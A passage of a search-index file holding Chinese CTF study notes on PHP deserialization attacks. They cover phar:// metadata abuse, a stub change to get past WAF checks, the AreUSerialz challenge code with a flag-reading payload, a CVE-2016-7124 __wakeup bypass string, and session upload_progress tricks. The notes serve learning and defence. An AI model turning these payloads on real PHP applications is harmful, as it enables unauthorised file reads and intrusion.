\u5bf9\u8c61\u88abunserialize()\u65f6\u81ea\u52a8\u8c03\u7528 destruct(): \u5f53\u672c\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u81ea\u52a8\u8c03\u7528 tostring(): \u5f53\u672c\u5bf9\u8c61\u88ab\u5f53\u4f5c\u5b57\u7b26\u4e32\u5904\u7406\u65f6\u8c03\u7528(echo\u7b49) get()/set(): \u5f53\u8bd5\u56fe\u83b7\u53d6/\u5199\u5165\u4e00\u4e2a\u4e0d\u53ef\u8fbe\u5230\u5c5e\u6027\u6216\u4e0d\u5b58\u5728\u7684\u503c\u65f6\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528 call(): \u4e0eget\u7c7b\u4f3c\uff0c\u5f53\u8bd5\u56fe\u8c03\u7528\u4e00\u4e2a\u4e0d\u53ef\u5230\u8fbe\u65b9\u6cd5\u65f6\u8c03\u7528 sleep/wakeup \u5f53\u5bf9\u8c61\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u65f6\u8c03\u7528 invoke \u5f53\u5bf9\u8c61\u88ab\u5f53\u4f5c\u51fd\u6570\u4f7f\u7528\u65f6\u8c03\u7528\u3002 \u5176\u4e2d\uff0c\u5bf9\u4e8eto_string()\u7684\u89e6\u53d1\u6761\u4ef6\u6709\u5f88\u591a\uff1a echo/print \u6253\u5370\u8f93\u51fa\u5bf9\u8c61\u65f6 \u5bf9\u8c61\u4e0e\u5b57\u7b26\u4e32\u62fc\u63a5\u6216==\u6bd4\u8f83\u65f6 \u5bf9\u8c61\u5728\u7ecf\u8fc7\u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\u5982 strlen()strstr()\u7b49\u65f6\u4ee5\u53caclass_exists()\u65f6 ctf\u4e2d\u7684\u53cd\u5e8f\u5217\u5316\u7ecf\u9a8c 1.\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c\uff0c\u4e00\u5207\u4ee5var_dump\u51fa\u6765\u7684\u9875\u9762\u7684\u6e90\u4ee3\u7801\u754c\u9762\u4e3a\u51c6!,\u4e14\u6e90\u4ee3\u7801\u4e2d\u7684\u4e71\u7801\u90e8\u5206hex\u7f16\u7801\u90fd\u662f00\uff01 \u6b64\u5916 private\u7684\u5e8f\u5217\u5316\u540e\u5c5e\u6027\u540d\u4f1a\u53d8\u4e3a %00class_name%00shuxing_name protected \u7684\u5e8f\u5217\u5316\u540e\u5c5e\u6027\u540d\u4f1a\u53d8\u4e3a %00 *%00shuxing_name 2.\u53e6\u5916\u4e00\u70b9\u5c31\u662f,\u4e00\u4e2a\u5bf9\u8c61\u88ab\u53cd\u5e8f\u5217\u5316\u51fa\u6765\u540e\uff0c\u4ed6\u5c31\u91ca\u653e\u5728\u5185\u5b58\u7a7a\u95f4\u6210\u4e3a\u4e00\u4e2a\u771f\u6b63\u5b58\u5728\u7684\u5bf9\u8c61\u4e86 3.\u8fd8\u6709\u4e00\u70b9\u662f\uff0c\u5e8f\u5217\u5316\u53ea\u4f1a\u8bb0\u5f55\u5c5e\u6027\u548c\u503c\uff0c\u4e0d\u4f1a\u8bb0\u5f55\u51fd\u6570 4.\u53cd\u5e8f\u5217\u5316\u540e\u4e0d\u4f1a\u8c03\u7528__constrict() \u5229\u7528phar\u6587\u4ef6 \u5f53\u4f7f\u7528phar\u6587\u4ef6\u65f6\uff0cphar\u6587\u4ef6\u7684meta-data\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u5728phar\u6587\u4ef6\u4e2d\u7684. \u90a3\u4e48\u5982\u4f55\u5229\u7528\u5462 \u57fa\u672c\u59ff\u52bf: \u4f7f\u7528phar://\u534f\u8bae\u8bbf\u95ee \u4f7f\u7528phar://\u534f\u8bae\uff0c\u662f\u4e0d\u7528\u7ba1\u540e\u7f00\u540d\uff0c\u4e00\u4e2ajpg\u6587\u4ef6\u90fd\u53ef\u4ee5\u88abphar://\u534f\u8bae\u6253\u5f00 phar://\u534f\u8bae\u8bbf\u95ee\u6587\u4ef6\u5e38\u7528 phar://\u6587\u4ef6\u8def\u5f84 \u8fdb\u9636\u59ff\u52bf 1.\u5e7b\u672f\u5934\u52a0\u5728stub\u4e0a \u6709\u4e9bwaf\u662f\u68c0\u9a8c\u6587\u4ef6\u5934\u7684\uff0c\u68c0\u9a8c\u5230 ?>\u662f\u4e0d\u8ba9\u8fc7\u7684\u3002\u6240\u4ee5\u9700\u8981\u6539\u6539stub\uff0c\u5728stub\u7684\u524d\u9762\u52a0\u4e0a\u4e00\u4e9b\u5e7b\u672f\u5934\u540c\u65f6\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d\u6765\u7ed5\u8fc7. \u4e0b\u9762\u662f\u80fd\u591f\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\u7684\u51fd\u6570 Phar\u6587\u4ef6\u521b\u5efa\u6a21\u677f $phar = new Phar('test.phar'); $phar->startBuffering(); $phar->addFromString('test.txt', 'text'); $phar->setStub('<?php __HALT_COMPILER(); ? >'); $phar->setMetadata($c); $phar->stopBuffering(); php\u7248\u672c7.1\u4ee5\u4e0a\uff0c\u5bf9\u7c7b\u5c5e\u6027\u68c0\u6d4b\u4e0d\u4e25\u683c\u5bfc\u81f4\u7684\u53cd\u5e8f\u5217\u5316\u95ee\u9898 php7.1+\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\u53ef\u4ee5\u76f4\u63a5\u4ee5public\u5c5e\u6027\u7684\u5f62\u5f0f\u5bf9\u539f\u7c7b\u4e2d\u7684protected\u5f62\u5f0f\u7684\u5c5e\u6027\u8fdb\u884c\u4fee\u6539\u3002 \u6bd4\u5982[\u7f51\u9f0e\u676f 2020 \u9752\u9f99\u7ec4]AreUSerialz\u4e00\u9898\u3002\u5176\u96be\u70b9\u5728\u4e8e\u4f60\u5fc5\u987b\u5728\u53cd\u5e8f\u5217\u5316payload\u4e2d\u4fee\u6539\u4e00\u4e2aprotected\u7684\u5c5e\u6027\u624d\u80fd\u62ff\u5230flag\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u5224\u65ad\u8bed\u53e5\u8ba9\u4f60\u4e0d\u80fd\u5728\u53cd\u5e8f\u5217\u5316payload\u51fa\u73b0%00\u5b57\u7b26\u3002 \u6240\u4ee5\u6b64\u5904\u6211\u4eec\u5728\u505apayload\u7684\u65f6\u5019\uff0c\u628aprotected\u5c5e\u6027\u6539\u6210public\u5c5e\u6027\u518d\u5e8f\u5217\u5316\u4e5f\u884c\u3002 protected $op; protected $filename; protected $content; public function process() { if($this->op == \"1\") { $this->write(); } else if($this->op == \"2\") { $res = $this->read(); $this->output($res); } else { $this->output(\"Bad Hacker!\"); } } private function read() { $res = \"\"; if(isset($this->filename)) { $res = file_get_contents($this->filename); } return $res; } function __destruct() { if($this->op === \"2\") $this->op = \"1\"; $this->content = \"\"; $this->process(); } function is_valid($s) { for($i = 0; $i < strlen($s); $i++) if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } \u5173\u952e\u4ee3\u7801\u653e\u8fd9\u91cc\u3002\u903b\u8f91\u662f\u4eceget\u53c2\u6570\u83b7\u53d6\u6570\u636e\u5e76\u53cd\u5e8f\u5217\u5316\u3002\u7136\u540e\u6211\u4eec\u901a\u8fc7\u53cd\u5e8f\u5217\u5316payload\u64cd\u63a7op\u8ba9\u5b83\u4e3a2\u5e76\u4e14filename=flag.php\u3002\u4f46\u662f\u6211\u4eec\u6b63\u5e38\u601d\u8def\u5236\u9020payload\u65f6\u56e0\u4e3aop\u548cfilename\u662fproteced\u5c5e\u6027\uff0c\u96be\u514d\u4f1a\u6709%00\u5b57\u7b26\u51fa\u73b0\uff0c\u4f46\u662f\u5b83\u53c8\u8ba9\u4f60\u4e0d\u80fd\u51fa\u73b0%00\u8fd9\u79cdascii\u7801\u5c0f\u4e8e32\u7684\u5b57\u7b26\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u628aop\u548cfilename\u5f53\u4f5cpublic\u5c5e\u6027\u5904\u7406\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fc7\u53bb \u4e5f\u5c31\u662f\u8bf4payload\u8fd9\u6837\u5199 new FileHandler{ public $op=2; public $filename=\"flag.php\" } \u7ed5\u8fc7__wakeup\u65b9\u6cd5(CVE-2016-7124) \u53ea\u9700\u6784\u5efa\u4e00\u4e2a\u5e8f\u5217\u5316\u5b57\u6bb5\uff0c\u5b83\u7684\u53d8\u91cf\u6570\u4e0e\u5b9e\u9645\u4e0d\u7b26\u5373\u53ef\u3002 \u50cf\u8fd9\u6837O:4:\u201dxctf\u201d:3:{s:4:\u201dflag\u201d;s:3:\u201d111\u2033;s:5:\u201dflsag\u201d;s:3:\u201d111\u2033;} \u8fd9\u91cc\u672c\u8eab\u67092\u4e2a\u53d8\u91cf\uff0c\u4f46\u5728\u6807\u8bc6\u53d8\u91cf\u6570\u65f6\u4e0e\u5b9e\u9645\u4e0d\u7b26\uff0c\u5c31\u4f1a\u7ed5\u8fc7__wakeup \u9002\u7528\u7248\u672c:PHP5 < 5.6.25 PHP7 < 7.0.10 session\u5b58\u50a8\u8c03\u7528\u4e0ephp\u53cd\u5e8f\u5217\u5316\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898 1.\u57fa\u7840\u529f\u80fd: session\u4fe1\u606f\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u65f6\uff0c\u5176\u5185\u5bb9\u662f\u901a\u8fc7\u4e00\u7cfb\u5217\u6bd4\u5982\u901a\u8fc7\u5e8f\u5217\u5316\u7b49\u64cd\u4f5c\u52a0\u5de5\u6539\u53d8\u4e86\u7684\uff0c\u800c\u5f53\u5176\u88ab\u8c03\u7528\u65f6\uff0c\u53c8\u80fd\u9006\u52a0\u5de5\u56de\u539f\u6709\u7684\u5185\u5bb9\uff0c\u8fd9\u662f\u57fa\u7840\u3002 session\u4fe1\u606f\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u65f6\uff0c\u5176\u52a0\u5de5\u65b9\u5f0f\u53ef\u4ee5\u901a\u8fc7php.ini\u6587\u4ef6\u7684session.save_handler= \u53c2\u6570\u8fdb\u884c\u8c03\u6574\u3002 \u8fd9\u4e2a\u53c2\u6570\u7684\u4e0d\u540c\u503c\u5bf9\u5e94\u7684\u52a0\u5de5\u65b9\u5f0f\u5982\u4e0b: $_SESSION['name']=$_GET['name'] //\u4f20\u5165\u53c2\u6570\u5e76\u5728session\u6587\u4ef6\u91cc\u4ee5name\u7684\u53d8\u91cf\u540d\u4fdd\u5b58 ini_set('session.serialize_handler','php')=>abc=>name|s:3:\"abc\"; //\u53d8\u91cf\u540d|\u5e8f\u5217\u5316\u5904\u7406\u540e\u7684\u503c ini_set('session.serialize_handler','php_binary')=>abc=>#names:4:\"abcd\"; //#\u4e3a\u952e\u540d\u957f\u5ea6\u5bf9\u5e94\u7684ascii\u5b57\u7b26+\u53d8\u91cf\u540d+\u5e8f\u5217\u5316\u540e\u7684\u503c ini_set('session.serialize_handler','php_serialize')=>abc=>a:1:{s:4:\"name\";s:3:\"abc\";} //\u5c06\u53d8\u91cf\u4ee5\u6570\u7ec4\u5f62\u5f0f\u8fdb\u884c\u5e8f\u5217\u5316\u5904\u7406 2.\u5728\u6b64\u57fa\u7840\u4e0a\u5229\u7528upload_process\u673a\u5236\u6765\u5b9e\u73b0 \u201c\u5373\u4f7f\u6ca1\u6709\u8f93\u5165\u70b9\u4e5f\u80fd\u7ee7\u7eed\u89e6\u53d1\u5e8f\u5217\u5316\u6f0f\u6d1e\" \u6ce8: \u5982\u679c\u6ca1\u5173session.upload_progress.cleanup\uff0c\u6bcf\u6b21\u5199\u5165session\u7684\u5185\u5bb9\u90fd\u4f1a\u88ab\u5220\uff0c\u8fd9\u6837\u7684\u8bdd\u53ea\u80fd\u4f7f\u7528\u6761\u4ef6\u7ade\u4e89\u6765\u641e\u4e86 \u4e0a\u9762\u7684\u8bdd\u7ffb\u8bd1\u4e3a: \u5f53session.upload_progress.enabled INI\u9009\u9879\u5f00\u542f\u65f6\uff0c\u4f60\u5728\u4e0a\u4f20\u6587\u4ef6\u7684\u540c\u65f6POST\u4e00\u4e2a\u53c2\u6570\u503c\u4e0esession.upload_progress.name\uff08\u9ed8\u8ba4\u4e3aPHP_SESSION_UPLOAD_PROGRESS\uff09\u503c\u7684\u503c\uff0c\u4f1a\u5728session\u91cc\u7559\u4e0bsession.upload_porgress.prefix\u4e0esession.upload_progress.name\u94fe\u63a5\u7684\u503c\uff0c\u800c\u540e\u8005\u7684\u5185\u5bb9\u5c31\u662f\u6211\u4eec\u4e0a\u4f20\u7684\u6587\u4ef6\u7684\u6587\u4ef6\u540d. \u8bd5\u9a8c\u4e00\u4e0b \u6293\u5305\u6539\u5305: \u786e\u5b9e\u6709\u6b8b\u7559,\u4e8e\u662f\u51ed\u6b64\u8fdb\u884c\u4e0a\u9762\u90a3\u6761\u7684\u64cd\u4f5c\u5f00\u59cb\u53cd\u5e8f\u5217\u5316\u653b\u51fb(\u6587\u4ef6\u5305\u542b\u4e5f\u884c)","title":"PHP\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php","text":"title: php\u53cd\u5e8f\u5217\u5316 date: tags: php\u5f00\u53d1\u4e0e\u5b89\u5168","title":"PHP\u53cd\u5e8f\u5217\u5316"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php_1","text":"","title":"php\u53cd\u5e8f\u5217\u5316\u57fa\u7840"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_1","text":"","title":"\u57fa\u7840\uff1a"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_2","text":"construct(): \u5f53\u672c\u5bf9\u8c61\u88ab\u521b\u5efa\u7684\u65f6\u5019\u81ea\u52a8\u8c03\u7528\uff0c\uff08unserialize()\u65f6\u4e0d\u4f1a\u88ab\u81ea\u52a8\u8c03\u7528\uff09 wakeup(): \u5bf9\u8c61\u88abunserialize()\u65f6\u81ea\u52a8\u8c03\u7528 destruct(): \u5f53\u672c\u5bf9\u8c61\u88ab\u9500\u6bc1\u65f6\u81ea\u52a8\u8c03\u7528 tostring(): \u5f53\u672c\u5bf9\u8c61\u88ab\u5f53\u4f5c\u5b57\u7b26\u4e32\u5904\u7406\u65f6\u8c03\u7528(echo\u7b49) get()/set(): \u5f53\u8bd5\u56fe\u83b7\u53d6/\u5199\u5165\u4e00\u4e2a\u4e0d\u53ef\u8fbe\u5230\u5c5e\u6027\u6216\u4e0d\u5b58\u5728\u7684\u503c\u65f6\uff0c\u4f1a\u81ea\u52a8\u8c03\u7528 call(): \u4e0eget\u7c7b\u4f3c\uff0c\u5f53\u8bd5\u56fe\u8c03\u7528\u4e00\u4e2a\u4e0d\u53ef\u5230\u8fbe\u65b9\u6cd5\u65f6\u8c03\u7528 sleep/wakeup \u5f53\u5bf9\u8c61\u88ab\u5e8f\u5217\u5316/\u53cd\u5e8f\u5217\u5316\u65f6\u8c03\u7528 invoke \u5f53\u5bf9\u8c61\u88ab\u5f53\u4f5c\u51fd\u6570\u4f7f\u7528\u65f6\u8c03\u7528\u3002 \u5176\u4e2d\uff0c\u5bf9\u4e8eto_string()\u7684\u89e6\u53d1\u6761\u4ef6\u6709\u5f88\u591a\uff1a echo/print \u6253\u5370\u8f93\u51fa\u5bf9\u8c61\u65f6 \u5bf9\u8c61\u4e0e\u5b57\u7b26\u4e32\u62fc\u63a5\u6216==\u6bd4\u8f83\u65f6 \u5bf9\u8c61\u5728\u7ecf\u8fc7\u5b57\u7b26\u4e32\u5904\u7406\u51fd\u6570\u5982 strlen()strstr()\u7b49\u65f6\u4ee5\u53caclass_exists()\u65f6","title":"\u9b54\u672f\u65b9\u6cd5"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#ctf","text":"1.\u5e8f\u5217\u5316\u540e\u7684\u7ed3\u679c\uff0c\u4e00\u5207\u4ee5var_dump\u51fa\u6765\u7684\u9875\u9762\u7684\u6e90\u4ee3\u7801\u754c\u9762\u4e3a\u51c6!,\u4e14\u6e90\u4ee3\u7801\u4e2d\u7684\u4e71\u7801\u90e8\u5206hex\u7f16\u7801\u90fd\u662f00\uff01 \u6b64\u5916 private\u7684\u5e8f\u5217\u5316\u540e\u5c5e\u6027\u540d\u4f1a\u53d8\u4e3a %00class_name%00shuxing_name protected \u7684\u5e8f\u5217\u5316\u540e\u5c5e\u6027\u540d\u4f1a\u53d8\u4e3a %00 *%00shuxing_name 2.\u53e6\u5916\u4e00\u70b9\u5c31\u662f,\u4e00\u4e2a\u5bf9\u8c61\u88ab\u53cd\u5e8f\u5217\u5316\u51fa\u6765\u540e\uff0c\u4ed6\u5c31\u91ca\u653e\u5728\u5185\u5b58\u7a7a\u95f4\u6210\u4e3a\u4e00\u4e2a\u771f\u6b63\u5b58\u5728\u7684\u5bf9\u8c61\u4e86 3.\u8fd8\u6709\u4e00\u70b9\u662f\uff0c\u5e8f\u5217\u5316\u53ea\u4f1a\u8bb0\u5f55\u5c5e\u6027\u548c\u503c\uff0c\u4e0d\u4f1a\u8bb0\u5f55\u51fd\u6570 4.\u53cd\u5e8f\u5217\u5316\u540e\u4e0d\u4f1a\u8c03\u7528__constrict()","title":"ctf\u4e2d\u7684\u53cd\u5e8f\u5217\u5316\u7ecf\u9a8c"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar","text":"\u5f53\u4f7f\u7528phar\u6587\u4ef6\u65f6\uff0cphar\u6587\u4ef6\u7684meta-data\u662f\u4ee5\u5e8f\u5217\u5316\u7684\u5f62\u5f0f\u5b58\u50a8\u5728phar\u6587\u4ef6\u4e2d\u7684. \u90a3\u4e48\u5982\u4f55\u5229\u7528\u5462","title":"\u5229\u7528phar\u6587\u4ef6"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_3","text":"\u4f7f\u7528phar://\u534f\u8bae\u8bbf\u95ee \u4f7f\u7528phar://\u534f\u8bae\uff0c\u662f\u4e0d\u7528\u7ba1\u540e\u7f00\u540d\uff0c\u4e00\u4e2ajpg\u6587\u4ef6\u90fd\u53ef\u4ee5\u88abphar://\u534f\u8bae\u6253\u5f00 phar://\u534f\u8bae\u8bbf\u95ee\u6587\u4ef6\u5e38\u7528 phar://\u6587\u4ef6\u8def\u5f84","title":"\u57fa\u672c\u59ff\u52bf:"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#_4","text":"1.\u5e7b\u672f\u5934\u52a0\u5728stub\u4e0a \u6709\u4e9bwaf\u662f\u68c0\u9a8c\u6587\u4ef6\u5934\u7684\uff0c\u68c0\u9a8c\u5230 ?>\u662f\u4e0d\u8ba9\u8fc7\u7684\u3002\u6240\u4ee5\u9700\u8981\u6539\u6539stub\uff0c\u5728stub\u7684\u524d\u9762\u52a0\u4e0a\u4e00\u4e9b\u5e7b\u672f\u5934\u540c\u65f6\u4fee\u6539\u6587\u4ef6\u540e\u7f00\u540d\u6765\u7ed5\u8fc7.","title":"\u8fdb\u9636\u59ff\u52bf"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar_1","text":"","title":"\u4e0b\u9762\u662f\u80fd\u591f\u89e6\u53d1phar\u53cd\u5e8f\u5217\u5316\u7684\u51fd\u6570"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#phar_2","text":"$phar = new Phar('test.phar'); $phar->startBuffering(); $phar->addFromString('test.txt', 'text'); $phar->setStub('<?php __HALT_COMPILER(); ? >'); $phar->setMetadata($c); $phar->stopBuffering();","title":"Phar\u6587\u4ef6\u521b\u5efa\u6a21\u677f"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#php71","text":"php7.1+\u53cd\u5e8f\u5217\u5316\u7684\u5bf9\u8c61\u53ef\u4ee5\u76f4\u63a5\u4ee5public\u5c5e\u6027\u7684\u5f62\u5f0f\u5bf9\u539f\u7c7b\u4e2d\u7684protected\u5f62\u5f0f\u7684\u5c5e\u6027\u8fdb\u884c\u4fee\u6539\u3002 \u6bd4\u5982[\u7f51\u9f0e\u676f 2020 \u9752\u9f99\u7ec4]AreUSerialz\u4e00\u9898\u3002\u5176\u96be\u70b9\u5728\u4e8e\u4f60\u5fc5\u987b\u5728\u53cd\u5e8f\u5217\u5316payload\u4e2d\u4fee\u6539\u4e00\u4e2aprotected\u7684\u5c5e\u6027\u624d\u80fd\u62ff\u5230flag\uff0c\u4f46\u662f\u6709\u4e00\u4e2a\u5224\u65ad\u8bed\u53e5\u8ba9\u4f60\u4e0d\u80fd\u5728\u53cd\u5e8f\u5217\u5316payload\u51fa\u73b0%00\u5b57\u7b26\u3002 \u6240\u4ee5\u6b64\u5904\u6211\u4eec\u5728\u505apayload\u7684\u65f6\u5019\uff0c\u628aprotected\u5c5e\u6027\u6539\u6210public\u5c5e\u6027\u518d\u5e8f\u5217\u5316\u4e5f\u884c\u3002 protected $op; protected $filename; protected $content; public function process() { if($this->op == \"1\") { $this->write(); } else if($this->op == \"2\") { $res = $this->read(); $this->output($res); } else { $this->output(\"Bad Hacker!\"); } } private function read() { $res = \"\"; if(isset($this->filename)) { $res = file_get_contents($this->filename); } return $res; } function __destruct() { if($this->op === \"2\") $this->op = \"1\"; $this->content = \"\"; $this->process(); } function is_valid($s) { for($i = 0; $i < strlen($s); $i++) if(!(ord($s[$i]) >= 32 && ord($s[$i]) <= 125)) return false; return true; } if(isset($_GET{'str'})) { $str = (string)$_GET['str']; if(is_valid($str)) { $obj = unserialize($str); } \u5173\u952e\u4ee3\u7801\u653e\u8fd9\u91cc\u3002\u903b\u8f91\u662f\u4eceget\u53c2\u6570\u83b7\u53d6\u6570\u636e\u5e76\u53cd\u5e8f\u5217\u5316\u3002\u7136\u540e\u6211\u4eec\u901a\u8fc7\u53cd\u5e8f\u5217\u5316payload\u64cd\u63a7op\u8ba9\u5b83\u4e3a2\u5e76\u4e14filename=flag.php\u3002\u4f46\u662f\u6211\u4eec\u6b63\u5e38\u601d\u8def\u5236\u9020payload\u65f6\u56e0\u4e3aop\u548cfilename\u662fproteced\u5c5e\u6027\uff0c\u96be\u514d\u4f1a\u6709%00\u5b57\u7b26\u51fa\u73b0\uff0c\u4f46\u662f\u5b83\u53c8\u8ba9\u4f60\u4e0d\u80fd\u51fa\u73b0%00\u8fd9\u79cdascii\u7801\u5c0f\u4e8e32\u7684\u5b57\u7b26\u3002\u6240\u4ee5\u6211\u4eec\u76f4\u63a5\u628aop\u548cfilename\u5f53\u4f5cpublic\u5c5e\u6027\u5904\u7406\u4e5f\u53ef\u4ee5\u76f4\u63a5\u8fc7\u53bb \u4e5f\u5c31\u662f\u8bf4payload\u8fd9\u6837\u5199 new FileHandler{ public $op=2; public $filename=\"flag.php\" }","title":"php\u7248\u672c7.1\u4ee5\u4e0a\uff0c\u5bf9\u7c7b\u5c5e\u6027\u68c0\u6d4b\u4e0d\u4e25\u683c\u5bfc\u81f4\u7684\u53cd\u5e8f\u5217\u5316\u95ee\u9898"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#__wakeupcve-2016-7124","text":"\u53ea\u9700\u6784\u5efa\u4e00\u4e2a\u5e8f\u5217\u5316\u5b57\u6bb5\uff0c\u5b83\u7684\u53d8\u91cf\u6570\u4e0e\u5b9e\u9645\u4e0d\u7b26\u5373\u53ef\u3002 \u50cf\u8fd9\u6837O:4:\u201dxctf\u201d:3:{s:4:\u201dflag\u201d;s:3:\u201d111\u2033;s:5:\u201dflsag\u201d;s:3:\u201d111\u2033;} \u8fd9\u91cc\u672c\u8eab\u67092\u4e2a\u53d8\u91cf\uff0c\u4f46\u5728\u6807\u8bc6\u53d8\u91cf\u6570\u65f6\u4e0e\u5b9e\u9645\u4e0d\u7b26\uff0c\u5c31\u4f1a\u7ed5\u8fc7__wakeup \u9002\u7528\u7248\u672c:PHP5 < 5.6.25 PHP7 < 7.0.10","title":"\u7ed5\u8fc7__wakeup\u65b9\u6cd5(CVE-2016-7124)"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#sessionphp","text":"","title":"session\u5b58\u50a8\u8c03\u7528\u4e0ephp\u53cd\u5e8f\u5217\u5316\u5f15\u53d1\u7684\u5b89\u5168\u95ee\u9898"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#1","text":"session\u4fe1\u606f\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u65f6\uff0c\u5176\u5185\u5bb9\u662f\u901a\u8fc7\u4e00\u7cfb\u5217\u6bd4\u5982\u901a\u8fc7\u5e8f\u5217\u5316\u7b49\u64cd\u4f5c\u52a0\u5de5\u6539\u53d8\u4e86\u7684\uff0c\u800c\u5f53\u5176\u88ab\u8c03\u7528\u65f6\uff0c\u53c8\u80fd\u9006\u52a0\u5de5\u56de\u539f\u6709\u7684\u5185\u5bb9\uff0c\u8fd9\u662f\u57fa\u7840\u3002 session\u4fe1\u606f\u5728\u670d\u52a1\u5668\u7aef\u5b58\u50a8\u65f6\uff0c\u5176\u52a0\u5de5\u65b9\u5f0f\u53ef\u4ee5\u901a\u8fc7php.ini\u6587\u4ef6\u7684session.save_handler= \u53c2\u6570\u8fdb\u884c\u8c03\u6574\u3002 \u8fd9\u4e2a\u53c2\u6570\u7684\u4e0d\u540c\u503c\u5bf9\u5e94\u7684\u52a0\u5de5\u65b9\u5f0f\u5982\u4e0b: $_SESSION['name']=$_GET['name'] //\u4f20\u5165\u53c2\u6570\u5e76\u5728session\u6587\u4ef6\u91cc\u4ee5name\u7684\u53d8\u91cf\u540d\u4fdd\u5b58 ini_set('session.serialize_handler','php')=>abc=>name|s:3:\"abc\"; //\u53d8\u91cf\u540d|\u5e8f\u5217\u5316\u5904\u7406\u540e\u7684\u503c ini_set('session.serialize_handler','php_binary')=>abc=>#names:4:\"abcd\"; //#\u4e3a\u952e\u540d\u957f\u5ea6\u5bf9\u5e94\u7684ascii\u5b57\u7b26+\u53d8\u91cf\u540d+\u5e8f\u5217\u5316\u540e\u7684\u503c ini_set('session.serialize_handler','php_serialize')=>abc=>a:1:{s:4:\"name\";s:3:\"abc\";} //\u5c06\u53d8\u91cf\u4ee5\u6570\u7ec4\u5f62\u5f0f\u8fdb\u884c\u5e8f\u5217\u5316\u5904\u7406","title":"1.\u57fa\u7840\u529f\u80fd:"},{"location":"%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/#2upload_process","text":"\u6ce8: \u5982\u679c\u6ca1\u5173session.upload_progress.cleanup\uff0c\u6bcf\u6b21\u5199\u5165session\u7684\u5185\u5bb9\u90fd\u4f1a\u88ab\u5220\uff0c\u8fd9\u6837\u7684\u8bdd\u53ea\u80fd\u4f7f\u7528\u6761\u4ef6\u7ade\u4e89\u6765\u641e\u4e86 \u4e0a\u9762\u7684\u8bdd\u7ffb\u8bd1\u4e3a: \u5f53session.upload_progress.enabled 